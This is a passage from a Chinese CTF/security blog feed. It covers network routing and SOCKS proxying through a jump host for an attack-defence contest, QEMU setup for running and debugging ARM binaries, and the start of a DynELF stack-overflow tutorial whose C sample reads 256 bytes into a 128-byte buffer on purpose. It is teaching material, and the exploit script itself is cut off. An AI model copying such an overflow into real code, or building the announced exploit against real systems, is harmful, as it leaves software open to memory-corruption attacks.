<span class="number">00</span> <span class="number">01</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line"> <span class="number">10</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 <span class="number">00</span> <span class="number">08</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line"> <span class="number">16</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Realtek RTL8822BE <span class="number">802.11</span>ac PCIe Adapter</span><br><span class="line"> <span class="number">11</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b a0 ......Bluetooth Device (Personal Area Network)</span><br><span class="line">  <span class="number">1</span>...........................Software Loopback Interface <span class="number">1</span></span><br><span class="line"> <span class="number">19</span>...<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> e0 Microsoft Teredo Tunneling Adapter</span><br><span class="line">===========================================================================</span><br><span class="line"></span><br><span class="line">IPv4 路由表</span><br><span class="line">===========================================================================</span><br><span class="line">活动路由:</span><br><span class="line">网络目标        网络掩码          网关       接口   跃点数</span><br><span class="line">          <span class="number">0.0</span>.<span class="number">0.0</span>          <span class="number">0.0</span>.<span class="number">0.0</span>     <span class="number">192.168</span>.<span class="number">43.1</span>    <span class="number">192.168</span>.<span class="number">43.65</span>     <span class="number">35</span></span><br><span class="line">          <span class="number">0.0</span>.<span class="number">0.0</span>          <span class="number">0.0</span>.<span class="number">0.0</span>      <span class="number">10.0</span>.<span class="number">10.254</span>        <span class="number">10.0</span>.<span class="number">10.2</span>     <span class="number">25</span></span><br><span class="line">        <span class="number">10.0</span>.<span class="number">10.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">10.0</span>.<span class="number">10.2</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">      <span class="number">10.0</span>.<span class="number">10.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">127.0</span>.<span class="number">0.0</span>        <span class="number">255.0</span>.<span class="number">0.0</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">        <span class="number">127.0</span>.<span class="number">0.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">  <span class="number">127.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">    <span class="number">172.17</span>.<span class="number">126.96</span>  <span class="number">255.255</span>.<span class="number">255.240</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">    <span class="number">172.17</span>.<span class="number">126.97</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">   <span class="number">172.17</span>.<span class="number">126.111</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">43.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">43.65</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">   <span class="number">192.168</span>.<span class="number">43.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">56.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">56.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">   <span class="number">192.168</span>.<span class="number">56.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">61.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">     <span class="number">192.168</span>.<span class="number">61.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">   <span class="number">192.168</span>.<span class="number">61.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">159.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">159.1</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">192.168</span>.<span class="number">159.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">201.0</span>    <span class="number">255.255</span>.<span class="number">255.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">    <span class="number">192.168</span>.<span class="number">201.2</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">192.168</span>.<span class="number">201.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">        <span class="number">224.0</span>.<span class="number">0.0</span>        <span class="number">240.0</span>.<span class="number">0.0</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">127.0</span>.<span class="number">0.1</span>    <span class="number">331</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">56.1</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">201.2</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">172.17</span>.<span class="number">126.97</span>    <span class="number">271</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上         <span class="number">10.0</span>.<span class="number">10.2</span>    <span class="number">281</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">43.65</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上      <span class="number">192.168</span>.<span class="number">61.1</span>    <span class="number">291</span></span><br><span class="line">  <span class="number">255.255</span>.<span class="number">255.255</span>  <span class="number">255.255</span>.<span class="number">255.255</span>            在链路上     <span class="number">192.168</span>.<span class="number">159.1</span>    <span class="number">291</span></span><br><span class="line">===========================================================================</span><br><span class="line">永久路由:</span><br><span class="line">  无</span><br><span class="line"></span><br><span class="line">IPv6 路由表</span><br><span class="line">===========================================================================</span><br><span class="line">活动路由:</span><br><span class="line"> 接口跃点数网络目标                网关</span><br><span class="line"> <span class="number">16</span>     <span class="number">51</span> ::/<span class="number">0</span>                     fe80::<span class="number">90</span>f0:<span class="number">52</span>ff:fe0e:<span class="number">4</span>b86</span><br><span class="line">  <span class="number">1</span>    <span class="number">331</span> ::<span class="number">1</span>/<span class="number">128</span>                  在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> <span class="number">2001</span>::/<span class="number">32</span>                在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> <span class="number">2001</span>:<span class="number">0</span>:<span class="number">284</span>a:<span class="number">364</span>:<span class="number">181</span>c:cd3e:<span class="number">2097</span>:c0dd/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">16</span>     <span class="number">51</span> <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39::/<span class="number">64</span> 在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span>/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> <span class="number">2409</span>:<span class="number">8955</span>:<span class="number">3014</span>:<span class="number">2</span>e39:<span class="number">6513</span>:<span class="number">5</span>ca8:<span class="number">8</span>df0:e7f/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">4</span>    <span class="number">281</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">17</span>    <span class="number">281</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line">  <span class="number">9</span>    <span class="number">271</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">20</span>    <span class="number">281</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line">  <span class="number">7</span>    <span class="number">291</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">10</span>    <span class="number">291</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> fe80::/<span class="number">64</span>                在链路上</span><br><span class="line">  <span class="number">9</span>    <span class="number">271</span> fe80::<span class="number">861</span>:<span class="number">2</span>a51:<span class="number">6</span>e5a:<span class="number">761</span>b/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> fe80::<span class="number">181</span>c:cd3e:<span class="number">2097</span>:c0dd/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">4</span>    <span class="number">281</span> fe80::<span class="number">40</span>de:<span class="number">409</span>b:e37f:<span class="number">34</span>eb/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> fe80::<span class="number">4438</span>:<span class="number">1682</span>:<span class="number">19</span>e2:<span class="number">8070</span>/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">20</span>    <span class="number">281</span> fe80::<span class="number">716</span>b:<span class="number">1</span>e8e:e67a:bdf/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">10</span>    <span class="number">291</span> fe80::<span class="number">907</span>b:<span class="number">8932</span>:<span class="number">6</span>a09:c20b/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">7</span>    <span class="number">291</span> fe80::<span class="number">9401</span>:d238:<span class="number">7</span>f61:d7d3/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line"> <span class="number">17</span>    <span class="number">281</span> fe80::cd1f:a63d:<span class="number">6</span>cee:c094/<span class="number">128</span></span><br><span class="line">                                    在链路上</span><br><span class="line">  <span class="number">1</span>    <span class="number">331</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">  <span class="number">4</span>    <span class="number">281</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">17</span>    <span class="number">281</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">  <span class="number">9</span>    <span class="number">271</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">20</span>    <span class="number">281</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">16</span>    <span class="number">291</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">  <span class="number">7</span>    <span class="number">291</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">10</span>    <span class="number">291</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line"> <span class="number">19</span>    <span class="number">331</span> ff00::/<span class="number">8</span>                 在链路上</span><br><span class="line">===========================================================================</span><br><span class="line">永久路由:</span><br><span class="line">  无</span><br></pre></td></tr></table></figure><p>关键是看本机有线网卡和无线网卡的网络通信接口号，例如</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">接口列表</span><br><span class="line">  <span class="number">9</span>...<span class="number">00</span> <span class="number">15</span> <span class="number">5</span>d bf b4 b8 ......Hyper-V Virtual Ethernet Adapter</span><br><span class="line"> <span class="number">20</span>...<span class="number">80</span> e8 <span class="number">2</span>c <span class="number">1</span>a <span class="number">31</span> <span class="number">4</span>d ......Realtek PCIe GbE Family Controller</span><br><span class="line"> <span class="number">21</span>...<span class="number">08</span> <span class="number">00</span> <span class="number">58</span> <span class="number">00</span> <span class="number">00</span> <span class="number">05</span> ......SSL VPN Client Virtual Network Adapter</span><br><span class="line">  <span class="number">4</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">04</span> ......VirtualBox Host-Only Ethernet Adapter</span><br><span class="line"> <span class="number">17</span>...<span class="number">0</span>a <span class="number">00</span> <span class="number">27</span> <span class="number">00</span> <span class="number">00</span> <span class="number">11</span> ......VirtualBox Host-Only Ethernet Adapter <span class="comment">#2</span></span><br><span class="line"> <span class="number">25</span>...f2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter</span><br><span class="line"> <span class="number">15</span>...b2 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Microsoft Wi-Fi Direct Virtual Adapter <span class="comment">#3</span></span><br><span class="line">  <span class="number">7</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 <span class="number">00</span> <span class="number">01</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet1</span><br><span class="line"> <span class="number">10</span>...<span class="number">00</span> <span class="number">50</span> <span class="number">56</span> c0 <span class="number">00</span> <span class="number">08</span> ......VMware Virtual Ethernet Adapter <span class="keyword">for</span> VMnet8</span><br><span class="line"> <span class="number">16</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Realtek RTL8822BE <span class="number">802.11</span>ac PCIe Adapter</span><br><span class="line"> <span class="number">11</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b a0 ......Bluetooth Device (Personal Area Network)</span><br><span class="line">  <span class="number">1</span>...........................Software Loopback Interface <span class="number">1</span></span><br><span class="line"> <span class="number">19</span>...<span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> e0 Microsoft Teredo Tunneling Adapter</span><br></pre></td></tr></table></figure><p>我们一般都是有线网卡用的是比赛平台的内网环境，无线网卡就是外网环境，所以这个例子中</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">20</span>...<span class="number">80</span> e8 <span class="number">2</span>c <span class="number">1</span>a <span class="number">31</span> <span class="number">4</span>d ......Realtek PCIe GbE Family Controller</span><br><span class="line"><span class="number">16</span>...b0 <span class="number">68</span> e6 <span class="number">73</span> <span class="number">9</span>b <span class="number">9</span>f ......Realtek RTL8822BE <span class="number">802.11</span>ac PCIe Adapter</span><br></pre></td></tr></table></figure><p>有线网卡的接口号是：20，无线网卡的接口号是：16</p><p>然后就是清除原来的路由表</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route delete <span class="number">0.0</span>.<span class="number">0.0</span></span><br></pre></td></tr></table></figure><p>然后默认网络走无线网络的接口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">route add <span class="number">0.0</span>.<span class="number">0.0</span> mask <span class="number">0.0</span>.<span class="number">0.0</span> <span class="number">192.168</span>.<span class="number">43.1</span> metric <span class="number">1</span> <span class="keyword">if</span> <span class="number">16</span></span><br></pre></td></tr></table></figure><p>然后配置比赛内网的网段走有线端口</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add <span class="number">10.0</span>.<span class="number">10.0</span> mask <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">10.0</span>.<span class="number">10.254</span> metric <span class="number">3</span> <span class="keyword">if</span> <span class="number">20</span></span><br><span class="line">route add <span class="number">192.168</span>.<span class="number">100.0</span> mask <span class="number">255.255</span>.<span class="number">255.0</span> <span class="number">10.0</span>.<span class="number">10.254</span> metric <span class="number">3</span> <span class="keyword">if</span> <span class="number">20</span></span><br></pre></td></tr></table></figure><h2 id="跳板机and攻击机"><a href="#跳板机and攻击机" class="headerlink" title="跳板机and攻击机"></a>跳板机and攻击机</h2><p>可以先用Xshell连接上跳板机然后在跳板机中开启socks5代理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSH -&gt; 隧道 -&gt; 添加 -&gt; 类型（方向）-&gt; Dymaic（Socks4/5）</span><br></pre></td></tr></table></figure><p>记住跳板机的本地监听端口，然后用Proxifer新建一个代理服务器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Profile -&gt; Add -&gt; address: 127.0.0.1 port:刚刚记录的 Type:Socks5</span><br></pre></td></tr></table></figure><p>然后自定义网络代理流量规则</p><p><strong>Proxification Rules</strong> 将攻击机的地址填入 <strong>Target Hosts</strong> 然后 <strong>Action</strong> 选择我们刚刚创建的跳板机</p><p>这样就完成了基础的网络配置</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ARM与QEMU-Tips-1</title>
      <link href="/2019/12/30/ARM%E2%95%99%CE%B4QEMU-Tips-1/"/>
      <url>/2019/12/30/ARM%E2%95%99%CE%B4QEMU-Tips-1/</url>
      
        <content type="html"><![CDATA[<h2 id="QEMU的安装"><a href="#QEMU的安装" class="headerlink" title="QEMU的安装"></a>QEMU的安装</h2><h3 id="0x01-安装必要环境"><a href="#0x01-安装必要环境" class="headerlink" title="0x01 安装必要环境"></a>0x01 安装必要环境</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y qemu-user gcc-arm-linux-gnueabi binutils-arm-linux-gnueabigcc-arm-linux-gnueabi lib32ncurses5 lib32z1</span><br></pre></td></tr></table></figure><h3 id="0x02-安装Qemu"><a href="#0x02-安装Qemu" class="headerlink" title="0x02 安装Qemu"></a>0x02 安装Qemu</h3><p>有两种方法可以在Linux环境下安装Qemu工具，第一种直接使用XUbuntu系统的apt工具安装，但是这种方法安装的Qemu系统版本不是最新的，如果需要安装最新版本的Qemu工具，就需要通过Git工具下载源码，切换到最新分支再去编译安装了。具体操作如下所述</p><h4 id="快速安装Qemu："><a href="#快速安装Qemu：" class="headerlink" title="快速安装Qemu："></a>快速安装Qemu：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install qemu</span><br></pre></td></tr></table></figure><h4 id="下载Qemu源码编译安装"><a href="#下载Qemu源码编译安装" class="headerlink" title="下载Qemu源码编译安装"></a>下载Qemu源码编译安装</h4><p>从Git服务器下载Qemu代码，记着在下载之前选择并切换需要的源码分支：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone git://git.qemu-project.org/qemu.git</span><br></pre></td></tr></table></figure><p>编译并安装Qemu：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure --target-list=arm-softmmu --audio-drv-list=</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h4 id="查看Qemu版本"><a href="#查看Qemu版本" class="headerlink" title="查看Qemu版本"></a>查看Qemu版本</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm --version</span><br></pre></td></tr></table></figure><h4 id="查看Qemu支持的开发板"><a href="#查看Qemu支持的开发板" class="headerlink" title="查看Qemu支持的开发板"></a>查看Qemu支持的开发板</h4><p>Qemu工具支持大量开发板的虚拟，现存的大部分常用开发板都能很好地支持。通过下面的命令操作可以看到当前版本的Qemu工具支持的开发板列表：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-arm -M help</span><br></pre></td></tr></table></figure><h1 id="模拟ARM程序"><a href="#模拟ARM程序" class="headerlink" title="模拟ARM程序"></a>模拟ARM程序</h1><p>需要设置<strong>ld-linux.so</strong>的加载路径</p><p>以下两种方式都可以：</p><ul><li><code>qemu-arm -L /usr/arm-linux-gnueabi -cpu cortex-a15 awd7</code></li><li><code>export QEMU_LD_PREFIX=/usr/arm-linux-gnueabi qemu-arm -cpu cortex-a15 awd7</code></li></ul><p>如果不这样设置的话，一般会出现这样的错误，提示不能加载<code>ld-linux</code>:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/lib/ld-linux.so.3: No such file or directory</span><br></pre></td></tr></table></figure><p>当然，如果不这样设置的话，可以将程序编译成静态链接的，命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arm-linux-gnueabi-gcc -o simple -c simple -static</span><br></pre></td></tr></table></figure><h2 id="ARM程序调试"><a href="#ARM程序调试" class="headerlink" title="ARM程序调试"></a>ARM程序调试</h2><p>进行远程调试关键是增加 -g 参数，指定端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g 1235 -L /usr/arm-linux-gnueabi -cpu cortex-a15 awd7</span><br></pre></td></tr></table></figure><p> 然后使用GDB进行远程调试</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) target remote :1235</span><br><span class="line">Remote debugging using :1235</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>浅谈栈溢出填充布局-2</title>
      <link href="/2019/12/23/%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95%E2%95%92%E2%95%97%E2%95%A5%CF%84%E2%94%82%C3%B7%E2%95%A0%CE%B5%E2%94%82%CE%A3%E2%96%93%E2%95%9D%E2%95%9B%E2%95%93-2/"/>
      <url>/2019/12/23/%E2%95%9F%E2%94%82%E2%95%A0%E2%95%95%E2%95%92%E2%95%97%E2%95%A5%CF%84%E2%94%82%C3%B7%E2%95%A0%CE%B5%E2%94%82%CE%A3%E2%96%93%E2%95%9D%E2%95%9B%E2%95%93-2/</url>
      
        <content type="html"><![CDATA[<h2 id="DynELF"><a href="#DynELF" class="headerlink" title="DynELF"></a>DynELF</h2><p>当我们未知一个程序的<strong>libc</strong>版本时，可能就没法使用<strong>ret2libc</strong>或者<strong>ret2plt</strong>，这时我们可以考虑使用<strong>DynELF</strong>来获取我们所需要的地址，<strong>pwntools</strong>中已经自带了强大的工具</p><p>首先举一个带有漏洞的例子程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vul_func</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">128</span>];</span><br><span class="line">    read(STDIN_FILENO,buf,<span class="number">256</span>);<span class="comment">//STDIN_FILENO = 0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    vul_func();</span><br><span class="line">    write(STDOUT_FLENO,<span class="string">"Hello,World\n"</span>,<span class="number">13</span>);</span><br><span class="line">    <span class="comment">//STDOUT_FLENO = 1,13 = 13 char</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实这里可以说一下在<strong>UNIX</strong>一些系统调用中使用到<strong>STDIN_FILENO</strong>表示标准输入,<strong>STDOUT_FILENO</strong>表示标准输出，<strong>STDERR_FILENO</strong>表示标准出错，使用时需要加头文件<strong>&lt;unistd.h&gt;</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard file descriptors. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDIN_FILENO 0 <span class="comment">/* Standard input. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDOUT_FILENO 1 <span class="comment">/* Standard output. */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STDERR_FILENO 2 <span class="comment">/* Standard error output. */</span></span></span><br></pre></td></tr></table></figure><p>首先看一下完整的<strong>EXP</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 